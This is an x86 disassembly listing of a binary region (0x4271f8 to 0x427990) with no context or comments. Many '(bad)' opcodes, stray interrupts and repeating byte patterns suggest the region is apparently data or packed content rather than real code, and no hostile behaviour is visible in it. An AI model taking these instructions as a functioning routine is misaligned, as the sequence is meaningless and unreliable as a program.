  4271f8:	ins    DWORD PTR es:[edi],dx
  4271f9:	push   ebx
  4271fa:	adc    eax,DWORD PTR [ebx-0x2d]
  4271fd:	das    
  4271fe:	add    eax,0x808081a5
  427203:	int    0x76
  427205:	adc    ebp,ecx
  427207:	lea    edx,[ecx]
  427209:	int    0x89
  42720b:	int    0x80
  42720d:	cmp    esi,eax
  42720f:	shl    edx,cl
  427211:	sub    BYTE PTR [ebx],bh
  427213:	jns    0x4271e8
  427215:	mov    ebp,0xcad35392
  42721a:	je     0x4271a1
  42721c:	ror    ch,1
  42721e:	(bad)  
  42721f:	cmc    
  427220:	int    0x89
  427222:	int    0x96
  427224:	cmc    
  427225:	int    0x22
  427227:	cmp    ecx,DWORD PTR [edi]
  427229:	shr    ebx,cl
  42722b:	xchg   edx,eax
  42722c:	cmp    ebx,ecx
  42722e:	shr    edx,cl
  427230:	sub    BYTE PTR [ebx+0x13],dl
  427233:	retf   0x4d8c
  427236:	rol    BYTE PTR [edx-0x2d],1
  427239:	int    0x8d
  42723b:	adc    al,0xcd
  42723d:	mov    ebp,ecx
  42723f:	xchg   esi,eax
  427240:	adc    al,0xcd
  427242:	and    bh,BYTE PTR [ebx]
  427244:	psrlq  mm5,mm3
  427247:	xchg   edx,eax
  427248:	cmp    ebx,ecx
  42724a:	shr    edx,cl
  42724c:	sub    BYTE PTR [ebx+0x13],dl
  42724f:	retf   0x4d8c
  427252:	ror    BYTE PTR [edx-0x2d],1
  427255:	int    0x8d
  427257:	cmc    
  427258:	int    0x89
  42725a:	int    0x96
  42725c:	cmc    
  42725d:	int    0x22
  42725f:	cmp    ecx,DWORD PTR [edi]
  427261:	cmp    ebx,ecx
  427263:	shr    ebx,cl
  427265:	xchg   edx,eax
  427266:	shr    edx,cl
  427268:	sub    BYTE PTR [ebx+0x13],dl
  42726b:	retf   0x4d8c
  42726e:	push   ebp
  42726f:	pusha  
  427270:	jge    0x4272a1
  427272:	push   es
  427273:	mov    esp,0xcd808081
  427278:	jbe    0x42728e
  42727a:	int    0x8d
  42727c:	adc    al,0xcd
  42727e:	mov    ebp,ecx
  427280:	cmp    BYTE PTR [ebx],0xf0
  427283:	shl    edx,cl
  427285:	sub    BYTE PTR [ebx],bh
  427287:	jns    0x42725c
  427289:	mov    ebp,0xcad35392
  42728e:	je     0x427215
  427290:	ror    ch,1
  427292:	lea    edx,[ecx]
  427294:	int    0x89
  427296:	int    0x96
  427298:	adc    ebp,ecx
  42729a:	and    bh,BYTE PTR [ebx]
  42729c:	psrlq  mm5,mm3
  42729f:	xchg   edx,eax
  4272a0:	cmp    ebx,ecx
  4272a2:	shr    edx,cl
  4272a4:	sub    BYTE PTR [ebx+0x13],dl
  4272a7:	retf   0x4d8c
  4272aa:	rol    BYTE PTR [edx-0x2d],1
  4272ad:	int    0x8d
  4272af:	in     eax,dx
  4272b0:	int    0x89
  4272b2:	int    0x96
  4272b4:	in     eax,dx
  4272b5:	int    0x22
  4272b7:	cmp    ecx,DWORD PTR [edi]
  4272b9:	shr    ebx,cl
  4272bb:	xchg   edx,eax
  4272bc:	cmp    ebx,ecx
  4272be:	shr    edx,cl
  4272c0:	sub    BYTE PTR [ebx+0x13],dl
  4272c3:	retf   0x4d8c
  4272c6:	ror    BYTE PTR [edx-0x2d],1
  4272c9:	int    0x8d
  4272cb:	adc    ebp,ecx
  4272cd:	mov    ebp,ecx
  4272cf:	xchg   esi,eax
  4272d0:	adc    ebp,ecx
  4272d2:	and    bh,BYTE PTR [ebx]
  4272d4:	(bad)  
  4272d6:	(bad)  
  4272d8:	jmp    0x42726c
  4272da:	shr    edx,cl
  4272dc:	sub    BYTE PTR [ebx+0x13],dl
  4272df:	retf   0x4d8c
  4272e2:	push   ebp
  4272e3:	pusha  
  4272e4:	jge    0x427315
  4272e6:	push   es
  4272e7:	cmc    
  4272e8:	add    BYTE PTR [eax-0x12893280],0xcd
  4272ef:	(bad)  
  4272f0:	in     eax,dx
  4272f1:	int    0x89
  4272f3:	int    0x80
  4272f5:	cmp    esi,eax
  4272f7:	shl    edx,cl
  4272f9:	sub    BYTE PTR [ebx],bh
  4272fb:	jns    0x4272d0
  4272fd:	mov    ebp,0xcad35392
  427302:	je     0x427289
  427304:	ror    ch,1
  427306:	lea    edx,[ecx*8+0x1496cd89]
  42730d:	int    0x22
  42730f:	cmp    ecx,DWORD PTR [edi]
  427311:	shr    ebx,cl
  427313:	xchg   edx,eax
  427314:	cmp    ebx,ecx
  427316:	shr    edx,cl
  427318:	sub    BYTE PTR [ebx+0x13],dl
  42731b:	retf   0x4d8c
  42731e:	rol    BYTE PTR [edx-0x2d],1
  427321:	int    0x8d
  427323:	cmc    
  427324:	int    0x89
  427326:	int    0x96
  427328:	cmc    
  427329:	int    0x22
  42732b:	cmp    ecx,DWORD PTR [edi]
  42732d:	shr    ebx,cl
  42732f:	xchg   edx,eax
  427330:	cmp    ebx,ecx
  427332:	shr    edx,cl
  427334:	sub    BYTE PTR [ebx+0x13],dl
  427337:	retf   0x4d8c
  42733a:	ror    BYTE PTR [edx-0x2d],1
  42733d:	int    0x8d
  42733f:	adc    al,0xcd
  427341:	mov    ebp,ecx
  427343:	xchg   esi,eax
  427344:	adc    al,0xcd
  427346:	and    bh,BYTE PTR [ebx]
  427348:	(bad)  
  42734a:	(bad)  
  42734c:	jmp    0x4272e0
  42734e:	shr    edx,cl
  427350:	sub    BYTE PTR [ebx+0x13],dl
  427353:	retf   0x4d8c
  427356:	push   ebp
  427357:	pusha  
  427358:	jge    0x427389
  42735a:	push   es
  42735b:	add    DWORD PTR [eax+0x76cd8080],eax
  427361:	in     eax,dx
  427362:	int    0x8d
  427364:	in     eax,dx
  427365:	int    0x89
  427367:	int    0x80
  427369:	cmp    esi,eax
  42736b:	shl    edx,cl
  42736d:	sub    BYTE PTR [ebx],bh
  42736f:	jns    0x427344
  427371:	mov    ebp,0xcad35392
  427376:	je     0x4272fd
  427378:	ror    ch,1
  42737a:	(bad)  
  42737b:	cmc    
  42737c:	int    0x89
  42737e:	int    0x96
  427380:	cmc    
  427381:	int    0x22
  427383:	cmp    ecx,DWORD PTR [edi]
  427385:	shr    ebx,cl
  427387:	xchg   edx,eax
  427388:	cmp    ebx,ecx
  42738a:	shr    edx,cl
  42738c:	sub    BYTE PTR [ebx+0x13],dl
  42738f:	retf   0x4d8c
  427392:	rol    BYTE PTR [edx-0x2d],1
  427395:	int    0x8d
  427397:	adc    ebp,ecx
  427399:	mov    ebp,ecx
  42739b:	xchg   esi,eax
  42739c:	adc    ebp,ecx
  42739e:	and    bh,BYTE PTR [ebx]
  4273a0:	psrlq  mm5,mm3
  4273a3:	xchg   edx,eax
  4273a4:	cmp    ebx,ecx
  4273a6:	shr    edx,cl
  4273a8:	sub    BYTE PTR [ebx+0x13],dl
  4273ab:	retf   0x4d8c
  4273ae:	ror    BYTE PTR [edx-0x2d],1
  4273b1:	int    0x8d
  4273b3:	in     eax,dx
  4273b4:	int    0x89
  4273b6:	int    0x96
  4273b8:	in     eax,dx
  4273b9:	int    0x22
  4273bb:	cmp    ecx,DWORD PTR [edi]
  4273bd:	cmp    ebx,ecx
  4273bf:	shr    ebx,cl
  4273c1:	xchg   edx,eax
  4273c2:	shr    edx,cl
  4273c4:	sub    BYTE PTR [ebx+0x13],dl
  4273c7:	retf   0x4d8c
  4273ca:	push   ebp
  4273cb:	pusha  
  4273cc:	jge    0x4273a4
  4273ce:	xor    bh,cl
  4273d0:	jbe    0x4273a2
  4273d2:	jo     0x427391
  4273d4:	outs   dx,DWORD PTR ds:[esi]
  4273d5:	lods   eax,DWORD PTR ds:[esi]
  4273d6:	add    BYTE PTR [eax],al
  4273d8:	int    0x8d
  4273da:	pop    ebp
  4273db:	inc    ebx
  4273dc:	rcl    esp,cl
  4273de:	push   ss
  4273df:	int    0x76
  4273e1:	std    
  4273e2:	int    0x8d
  4273e4:	std    
  4273e5:	cmp    esi,eax
  4273e7:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273ea:	repnz sub bl,dl
  4273ed:	mov    ebp,0xad35392
  4273f2:	jbe    0x4273a1
  4273f4:	int    0x76
  4273f6:	stc    
  4273f7:	int    0xa6
  4273f9:	stc    
  4273fa:	int    0x76
  4273fc:	stc    
  4273fd:	int    0x8d
  4273ff:	stc    
  427400:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427406:	xchg   edx,eax
  427407:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42740d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42740e:	gs int 0x76
  427411:	xchg   ebp,eax
  427412:	cmp    ecx,DWORD PTR [edi]
  427414:	add    al,0xf2
  427416:	std    
  427417:	add    al,0xad
  427419:	std    
  42741a:	shr    esp,cl
  42741c:	sub    BYTE PTR [edi+0x12db537d],al
  427422:	hlt    
  427423:	dec    ecx
  427424:	and    DWORD PTR [esi-0x28932cb],eax
  42742a:	int    0x8d
  42742c:	std    
  42742d:	cmp    esi,eax
  42742f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427432:	repnz sub bl,dl
  427435:	mov    ebp,0xcdd35392
  42743a:	lea    ebp,[ebp+0x52f7d43]
  427440:	push   ds
  427441:	std    
  427442:	add    BYTE PTR [eax],al
  427444:	int    0x76
  427446:	std    
  427447:	int    0x8d
  427449:	std    
  42744a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42744d:	lock shl edx,cl
  427450:	sub    bl,dl
  427452:	mov    ebp,0xcdd35392
  427457:	lea    ebp,[ebp+0x1ad67d43]
  42745d:	int    0x76
  42745f:	stc    
  427460:	int    0x8d
  427462:	stc    
  427463:	cmp    edi,DWORD PTR [ecx+0x3b]
  427466:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42746d:	push   ebx
  42746e:	shr    ebx,cl
  427470:	jle    0x4273f3
  427472:	add    BYTE PTR [eax+0x5b6324c0],0x0
  427479:	(bad)  
  42747a:	popf   
  42747b:	iret   
  42747c:	jbe    0x427493
  42747e:	jo     0x42743d
  427480:	jge    0x42745d
  427482:	add    BYTE PTR [eax],al
  427484:	int    0x76
  427486:	std    
  427487:	int    0x8d
  427489:	std    
  42748a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42748d:	lock shl edx,cl
  427490:	sub    bl,dl
  427492:	mov    ebp,0xcdd35392
  427497:	lea    esp,[ebp+0x5bd4d343]
  42749d:	int    0x76
  42749f:	stc    
  4274a0:	int    0x8d
  4274a2:	stc    
  4274a3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274a6:	lock shl edx,cl
  4274a9:	sub    bl,dl
  4274ab:	mov    ebp,0xcdd35392
  4274b0:	lea    esp,[ebp+0x26d4d343]
  4274b6:	int    0x76
  4274b8:	stc    
  4274b9:	int    0x8d
  4274bb:	stc    
  4274bc:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274bf:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274c6:	push   ebx
  4274c7:	shl    DWORD PTR [eax+0x5b],cl
  4274ca:	iret   
  4274cb:	jbe    0x4274e2
  4274cd:	jo     0x42748c
  4274cf:	das    
  4274d0:	cli    
  4274d1:	add    BYTE PTR [eax],al
  4274d3:	int    0x76
  4274d5:	std    
  4274d6:	int    0x8d
  4274d8:	std    
  4274d9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274dc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4274e3:	push   ebx
  4274e4:	shl    DWORD PTR [eax+0x5b],cl
  4274e7:	iret   
  4274e8:	jbe    0x4274ff
  4274ea:	jo     0x4274a9
  4274ec:	sti    
  4274ed:	stc    
  4274ee:	add    BYTE PTR [eax],al
  4274f0:	int    0x76
  4274f2:	popf   
  4274f3:	xchg   ebp,eax
  4274f5:	or     dh,BYTE PTR [esi+0x14]
  4274f8:	add    dh,dl
  4274fa:	cmp    eax,0xcd14d600
  4274ff:	jbe    0x427536
  427501:	xchg   DWORD PTR [esi-0x78],esi
  427504:	jo     0x4274c3
  427506:	push   edx
  427507:	fild   DWORD PTR [eax]
  427509:	add    ch,cl
  42750b:	jbe    0x42750a
  42750d:	int    0x8d
  42750f:	std    
  427510:	cmp    edi,DWORD PTR [ecx+0x3b]
  427513:	lock shl edx,cl
  427516:	sub    bl,dl
  427518:	mov    ebp,0xcdd35392
  42751d:	lea    esp,[ebp-0x592b2cbd]
  427523:	int    0x76
  427525:	stc    
  427526:	int    0x8d
  427528:	stc    
  427529:	cmp    edi,DWORD PTR [ecx+0x3b]
  42752c:	lock shl edx,cl
  42752f:	sub    bl,dl
  427531:	mov    ebp,0xcdd35392
  427536:	lea    esp,[ebp+0x32d4d343]
  42753c:	int    0x76
  42753e:	stc    
  42753f:	int    0x8d
  427541:	stc    
  427542:	cmp    edi,DWORD PTR [ecx-0x2d]
  427545:	mov    ebp,0xd3f03b92
  42754a:	repnz sub BYTE PTR [ebx-0x2d],dl
  42754e:	jo     0x427550
  427550:	(bad)  
  427551:	cmp    eax,0x873576cd
  427556:	jbe    0x4274e0
  427558:	jo     0x427517
  42755a:	add    eax,0xcd0000f9
  42755f:	jbe    0x42755e
  427561:	int    0x8d
  427563:	std    
  427564:	cmp    edi,DWORD PTR [ecx-0x2d]
  427567:	mov    ebp,0xd3f03b92
  42756c:	repnz sub BYTE PTR [ebx-0x2d],dl
  427570:	jo     0x427572
  427572:	(bad)  
  427573:	cmp    eax,0x873576cd
  427578:	jbe    0x427502
  42757a:	jo     0x427539
  42757c:	jb     0x427577
  42757e:	add    BYTE PTR [eax],al
  427580:	int    0x8d
  427582:	inc    ebp
  427583:	int    0x76
  427585:	inc    ebp
  427586:	cmp    ecx,ecx
  427588:	cmp    ecx,DWORD PTR [edi]
  42758a:	shr    ebx,cl
  42758c:	xchg   edx,eax
  42758d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427593:	lea    ebp,ds:0x803fd33b
  427599:	add    DWORD PTR [eax+0x3614d480],0x80800180
  4275a3:	jo     0x4275a5
  4275a5:	(bad)  
  4275a6:	cmp    eax,0x87358dcd
  4275ab:	lea    ecx,[eax+0xa95abd]
  4275b1:	add    ch,cl
  4275b3:	jbe    0x4275e5
  4275b5:	int    0x8d
  4275b7:	cmp    eax,0x76cd8881
  4275bc:	cmp    eax,0xabd7687
  4275c1:	jbe    0x427580
  4275c3:	int    0x76
  4275c5:	stc    
  4275c6:	int    0x8d
  4275c8:	stc    
  4275c9:	cmp    esi,eax
  4275cb:	shl    edx,cl
  4275cd:	sub    BYTE PTR [ebx],bh
  4275cf:	jns    0x4275a4
  4275d1:	mov    ebp,0xcdd35392
  4275d6:	lea    edi,[ebp-0x322c2ed1]
  4275dc:	(bad)  
  4275dd:	std    
  4275de:	int    0x96
  4275e0:	std    
  4275e1:	cmp    ecx,DWORD PTR [edi]
  4275e3:	cmp    ebx,ecx
  4275e5:	shr    ebx,cl
  4275e7:	xchg   edx,eax
  4275e8:	shr    edx,cl
  4275ea:	sub    BYTE PTR [ebx+0x13],dl
  4275ed:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  4275f3:	or     edi,DWORD PTR [ecx]
  4275f5:	cli    
  4275f6:	add    BYTE PTR [eax],al
  4275f8:	int    0x76
  4275fa:	mov    BYTE PTR [edx-0x2d349c58],ch
  427600:	xor    BYTE PTR [eax+0x4edcd96],al
  427606:	in     eax,dx
  427607:	adc    al,0x5b
  427609:	cwde   
  42760a:	call   0xcd34:0x76cd6d3b
  427611:	add    DWORD PTR ds:0xcd808081,ebp
  427617:	xchg   esi,eax
  427618:	mov    ch,cl
  42761a:	or     ch,0xd6
  42761d:	dec    esp
  42761e:	int    0xe6
  427620:	mov    ch,cl
  427622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427623:	dec    esp
  427624:	or     dh,BYTE PTR [esi-0x3]
  427627:	pop    edi
  427628:	jnp    0x427661
  42762a:	ficom  WORD PTR [ebx]
  42762c:	cmp    esp,ebx
  42762e:	pop    ebp
  42762f:	mov    ebp,0x3b25230a
  427634:	adc    DWORD PTR [edi],ebp
  427636:	inc    ebp
  427637:	sti    
  427638:	xchg   edx,eax
  427639:	shr    ecx,cl
  42763b:	sub    BYTE PTR [edx],dl
  42763d:	clc    
  42763e:	add    BYTE PTR [eax-0x102c9380],0x92
  427645:	cmp    ebx,ebp
  427647:	push   ebx
  427648:	clc    
  427649:	int    0xe6
  42764b:	sbb    al,0x53
  42764d:	aad    0x43
  42764f:	(bad)  
  427651:	sbb    eax,DWORD PTR [ebx-0xc]
  427654:	(bad)  
  427655:	das    
  427656:	adc    cl,BYTE PTR [ebp+0x59]
  427659:	je     0x427605
  42765b:	push   edi
  42765c:	ja     0x427623
  42765e:	xchg   edi,eax
  42765f:	shr    ebx,0xd9
  427662:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  42766c:	xchg   esi,eax
  42766d:	mov    ch,cl
  42766f:	(bad)  
  427670:	dec    esp
  427671:	int    0x96
  427673:	mov    ch,cl
  427675:	(bad)  
  427676:	dec    esp
  427677:	int    0xe6
  427679:	mov    ch,cl
  42767b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42767c:	dec    esp
  42767d:	cmp    edx,DWORD PTR [ecx]
  42767f:	cmp    esp,ebx
  427681:	das    
  427682:	inc    ebp
  427683:	sti    
  427684:	xchg   edx,eax
  427685:	shr    ecx,cl
  427687:	sub    BYTE PTR [edx],dl
  427689:	clc    
  42768a:	add    BYTE PTR [eax-0x22c49380],0x53
  427691:	aad    0xd3
  427693:	out    dx,eax
  427694:	xchg   edx,eax
  427695:	push   ebx
  427696:	clc    
  427697:	int    0xe6
  427699:	xor    ch,cl
  42769b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42769c:	adc    al,0x3b
  42769e:	popf   
  42769f:	int    0x76
  4276a1:	xor    BYTE PTR [ebx],bh
  4276a3:	cli    
  4276a4:	int    0x8d
  4276a6:	adc    al,0x2f
  4276a8:	inc    ebp
  4276a9:	loope  0x42763d
  4276ab:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  4276b1:	cli    
  4276b2:	push   esi
  4276b3:	add    BYTE PTR [eax-0x132c9380],0x92
  4276ba:	push   ebx
  4276bb:	popf   
  4276bc:	int    0x76
  4276be:	mov    BYTE PTR [edi-0x320be427],al
  4276c4:	bswap  ebp
  4276c6:	(bad)  
  4276c7:	dec    esp
  4276c8:	int    0xe6
  4276ca:	xor    ch,cl
  4276cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276cd:	adc    al,0x4
  4276cf:	lods   eax,DWORD PTR ds:[esi]
  4276d0:	std    
  4276d1:	add    al,0xe9
  4276d3:	std    
  4276d4:	shr    ebx,cl
  4276d6:	sub    BYTE PTR [ebx],bh
  4276d8:	ficom  DWORD PTR [esi-0x2c]
  4276db:	aaa    
  4276dc:	ficom  WORD PTR [ebx]
  4276de:	adc    dh,bh
  4276e0:	mov    ebp,0x1225230a
  4276e5:	clc    
  4276e6:	aam    0x37
  4276e8:	ficom  WORD PTR [ebx]
  4276ea:	adc    dh,ah
  4276ec:	mov    ebp,0x8725230a
  4276f1:	leave  
  4276f2:	sbb    esi,esp
  4276f4:	push   ebx
  4276f5:	jge    0x42774a
  4276f7:	cdq    
  4276f8:	pop    ebp
  4276f9:	mov    ebp,0x1225230a
  4276fe:	add    dl,dh
  427700:	aaa    
  427701:	ficom  WORD PTR [ebx]
  427703:	cmp    esi,ecx
  427705:	adc    bh,dl
  427707:	out    0x37,al
  427709:	ficom  WORD PTR [ebx]
  42770b:	(bad)  
  42770c:	sbb    eax,DWORD PTR [ebx-0xf]
  42770f:	(bad)  
  427710:	das    
  427711:	adc    dl,BYTE PTR [esi-0x1]
  427714:	das    
  427715:	stos   DWORD PTR es:[edi],eax
  427716:	push   es
  427717:	in     eax,0x9b
  427719:	xchg   edi,eax
  42771a:	imul   bl
  42771c:	and    al,0x81
  42771e:	add    BYTE PTR [eax-0x32776933],0xd6
  427725:	dec    esp
  427726:	int    0xa6
  427728:	mov    ch,cl
  42772a:	out    0x4c,al
  42772c:	cmp    edx,DWORD PTR [ecx]
  42772e:	pop    edi
  42772f:	jnp    0x427768
  427731:	ficom  WORD PTR [ebx]
  427733:	cmp    esp,ebx
  427735:	das    
  427736:	inc    ebp
  427737:	sti    
  427738:	xchg   edx,eax
  427739:	shr    edi,cl
  42773b:	xchg   edx,eax
  42773c:	cmp    eax,DWORD PTR [eax]
  42773e:	shl    ebp,cl
  427740:	sub    BYTE PTR [edx],cl
  427742:	(bad)  
  427743:	cmc    
  427744:	push   ebx
  427745:	fxch   st(5)
  427747:	out    0xf5,al
  427749:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  427753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427754:	and    al,0xcd
  427756:	and    ecx,DWORD PTR [edx]
  427758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427759:	adc    DWORD PTR [ebx-0x1e],eax
  42775c:	(bad)  
  42775d:	xchg   BYTE PTR [ebx],bh
  42775f:	fiadd  DWORD PTR [ebx-0x27]
  427762:	aam    0x20
  427764:	add    dh,dl
  427766:	xor    al,0xcd
  427768:	(bad)  
  427769:	and    al,0x0
  42776b:	(bad)  
  42776c:	sub    al,0x0
  42776e:	(bad)  
  42776f:	std    
  427770:	add    BYTE PTR [eax-0x43],bl
  427773:	sub    edi,eax
  427775:	add    BYTE PTR [eax],al
  427777:	or     al,BYTE PTR [esi-0x7f7f9615]
  42777d:	or     ch,0x96
  427780:	mov    ch,cl
  427782:	out    0x4c,al
  427784:	cmp    edi,ecx
  427786:	cmp    esp,ebx
  427788:	das    
  427789:	inc    ebp
  42778a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427790:	out    0xf5,al
  427792:	int    0xe6
  427794:	mov    ch,cl
  427796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427797:	dec    esp
  427798:	shr    ecx,cl
  42779a:	sub    BYTE PTR [ebx],bh
  42779c:	dec    ebp
  42779e:	(bad)  
  42779f:	cmc    
  4277a0:	cmp    ebx,ebp
  4277a2:	push   ebx
  4277a3:	clc    
  4277a4:	int    0xe6
  4277a6:	xor    BYTE PTR [ebx],bh
  4277a8:	cli    
  4277a9:	push   ebx
  4277aa:	aad    0xcd
  4277ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277ad:	adc    al,0x3b
  4277af:	popf   
  4277b0:	int    0xc9
  4277b2:	int    0xe6
  4277b4:	xor    ch,cl
  4277b6:	or     al,0xcd
  4277b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277b9:	adc    al,0x2f
  4277bb:	inc    ebp
  4277bc:	jge    0x427750
  4277be:	shr    ecx,cl
  4277c0:	sub    BYTE PTR [ebx],bh
  4277c2:	fst    st(3)
  4277c4:	jmp    0x427758
  4277c6:	adc    bh,al
  4277c8:	add    BYTE PTR [eax-0x3aac9380],0x53
  4277cf:	lock inc ebx
  4277d1:	icebp  
  4277d2:	(bad)  
  4277d3:	sbb    BYTE PTR [ebx+0x2],al
  4277d6:	(bad)  
  4277d7:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  4277dd:	mov    esi,0xdd8bf56d
  4277e2:	(bad)  
  4277e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277e4:	cmp    edi,esp
  4277e6:	sbb    eax,0xcd62ec76
  4277eb:	jbe    0x427775
  4277ed:	int    0x8d
  4277ef:	dec    esp
  4277f0:	int    0x96
  4277f2:	mov    ch,cl
  4277f4:	(bad)  
  4277f5:	dec    esp
  4277f6:	adc    al,BYTE PTR [edx]
  4277f8:	mov    ebp,0x5625230a
  4277fd:	jnp    0x427836
  4277ff:	ficom  WORD PTR [ebx]
  427801:	das    
  427802:	inc    ebp
  427803:	jge    0x427797
  427805:	int    0xfb
  427807:	cmp    eax,DWORD PTR [eax]
  427809:	cmp    ebx,edx
  42780b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427811:	jmp    0x4277a5
  427813:	adc    dh,bh
  427815:	add    BYTE PTR [eax-0x36ac9380],0x53
  42781c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427820:	(bad)  
  427821:	test   BYTE PTR [ebx-0x1d],al
  427824:	aam    0x4c
  427826:	adc    al,BYTE PTR [esi-0x3e]
  427829:	gs sub al,0x1
  42782c:	jo     0x427868
  42782e:	mov    edx,0x124aece0
  427833:	ss inc edx
  427835:	das    
  427836:	sbb    edx,esi
  427838:	mov    ebx,0xaa029f75
  42783d:	test   al,0x63
  42783f:	retf   
  427840:	shr    BYTE PTR [eax+eax*4],cl
  427843:	xchg   esi,eax
  427844:	int    0xed
  427846:	add    al,0xed
  427848:	dec    esp
  427849:	int    0x76
  42784b:	mov    ch,cl
  42784d:	lea    ecx,[edi+ebp*1+0x45]
  427851:	jge    0x4277e5
  427853:	shr    ebx,cl
  427855:	xchg   edx,eax
  427856:	int    0x8d
  427858:	mov    ch,cl
  42785a:	xchg   esi,eax
  42785b:	dec    esp
  42785c:	cwde   
  42785d:	shl    edx,cl
  42785f:	sub    ch,cl
  427861:	lea    ebx,[ecx+ebp*2]
  427864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427865:	mov    esi,0x793b4229
  42786a:	cmp    ebx,edx
  42786c:	push   ebx
  42786d:	ror    BYTE PTR [edx],cl
  42786f:	or     ebp,0x1cd2476
  427875:	xor    eax,0xcd808081
  42787a:	mov    ch,cl
  42787c:	jbe    0x4278a2
  42787e:	int    0x1
  427880:	xor    eax,0xcd808081
  427885:	add    BYTE PTR [edi-0x72329b92],0x24
  42788c:	int    0xa
  42788e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427894:	adc    al,0xc0
  427896:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42789d:	nop
  42789e:	jo     0x427902
  4278a0:	add    bl,ah
  4278a2:	or     cl,BYTE PTR [ebx-0x32778933]
  4278a8:	lea    ecx,[edi+ebp*1+0x45]
  4278ac:	jge    0x427840
  4278ae:	shr    ebx,cl
  4278b0:	xchg   edx,eax
  4278b1:	int    0x8d
  4278b3:	mov    ch,cl
  4278b5:	xchg   esi,eax
  4278b6:	dec    esp
  4278b7:	add    dh,dl
  4278b9:	and    al,0x3b
  4278bb:	jns    0x4278f8
  4278bd:	ficom  DWORD PTR [ebx-0x2e]
  4278c0:	or     dh,BYTE PTR [esi-0x3]
  4278c3:	iret   
  4278c4:	jbe    0x4278c3
  4278c6:	jo     0x427862
  4278c8:	add    dh,dl
  4278ca:	sbb    al,0xd3
  4278cc:	repnz sub BYTE PTR [eax],al
  4278cf:	(bad)  
  4278d0:	adc    al,0x0
  4278d2:	(bad)  
  4278d3:	xor    BYTE PTR [eax],al
  4278d5:	(bad)  
  4278d6:	dec    esp
  4278d7:	add    dh,dl
  4278d9:	mov    BYTE PTR [ebp+0xfe2b],bh
  4278df:	int    0x76
  4278e1:	mov    ch,cl
  4278e3:	lea    ecx,[edi+ebp*1+0x45]
  4278e7:	jge    0x42787b
  4278e9:	shr    ebx,cl
  4278eb:	xchg   edx,eax
  4278ec:	int    0x8d
  4278ee:	mov    ch,cl
  4278f0:	xchg   esi,eax
  4278f1:	dec    esp
  4278f2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4278f5:	fcmovbe st,st(3)
  4278f7:	repnz sub ch,cl
  4278fa:	das    
  4278fb:	push   ebx
  4278fc:	rol    BYTE PTR [ebx+0x7d],cl
  4278ff:	aam    0x36
  427901:	int    0x76
  427903:	xor    ch,cl
  427905:	lea    edx,[edi+ebp*1]
  427908:	inc    ebp
  427909:	jge    0x42789d
  42790b:	shr    ebx,cl
  42790d:	xchg   edx,eax
  42790e:	int    0x8d
  427910:	xor    ch,cl
  427912:	xchg   esi,eax
  427913:	adc    al,0x3b
  427915:	jns    0x427952
  427917:	fcmovbe st,st(3)
  427919:	repnz sub ch,cl
  42791c:	lea    ebx,[ebx+edx*2]
  42791f:	shr    BYTE PTR [edi],cl
  427921:	shl    DWORD PTR [esi-0x3],1
  427924:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42792a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427931:	call   0xcd3c:0xd6cd6d3b
  427938:	xchg   esi,eax
  427939:	inc    esp
  42793a:	int    0xe6
  42793c:	and    al,0x5d
  42793e:	mov    ebp,0x5f25230a
  427943:	jnp    0x42797c
  427945:	ficom  WORD PTR [ebx]
  427947:	inc    ebx
  427948:	icebp  
  427949:	das    
  42794a:	or     BYTE PTR [edi],al
  42794c:	add    BYTE PTR [eax-0x4613080],0x82
  427953:	test   BYTE PTR [ebx-0xc],al
  427956:	jnp    0x42793e
  427958:	inc    ebx
  427959:	hlt    
  42795a:	(bad)  
  42795b:	mov    BYTE PTR [ebx-0xf],al
  42795e:	das    
  42795f:	add    eax,0x80809216
  427964:	adc    bh,bh
  427966:	jno    0x42799f
  427968:	ficom  WORD PTR [ebx]
  42796a:	(bad)  
  42796b:	mov    BYTE PTR [ebx-0xf],al
  42796e:	das    
  42796f:	add    eax,0x80809285
  427974:	adc    bh,bh
  427976:	xchg   esi,eax
  427977:	aaa    
  427978:	ficom  WORD PTR [ebx]
  42797a:	(bad)  
  42797b:	mov    BYTE PTR [ebx-0xf],al
  42797e:	das    
  42797f:	add    eax,0x808080f8
  427984:	adc    bh,bh
  427986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427987:	aaa    
  427988:	ficom  WORD PTR [ebx]
  42798a:	(bad)  
  42798b:	test   BYTE PTR [ebx-0xf],al
  42798e:	aam    0x3e
  427990:	adc    bh,bh
